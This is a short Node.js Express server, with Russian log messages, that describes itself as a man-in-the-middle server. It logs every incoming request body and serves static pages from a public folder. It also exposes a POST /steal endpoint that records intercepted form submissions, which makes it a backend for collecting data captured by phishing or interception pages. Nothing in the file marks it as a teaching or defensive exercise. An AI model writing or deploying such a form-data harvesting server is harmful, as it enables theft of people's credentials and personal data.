import express from "express";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8080;

app.use(express.json());
app.use((req, res, next) => {
    console.log(`[MITM] ${req.method} ${req.url}`, req.body || "");
    next();
});

app.use(express.static(path.join(__dirname, "public")));

app.post("/steal", (req, res) => {
    console.log("🔥 Перехваченные данные формы:", req.body);
    res.send({ status: "ok" });
});


app.listen(PORT, () => {
    console.log(`MITM-сервер запущен → http://localhost:${PORT}`);
});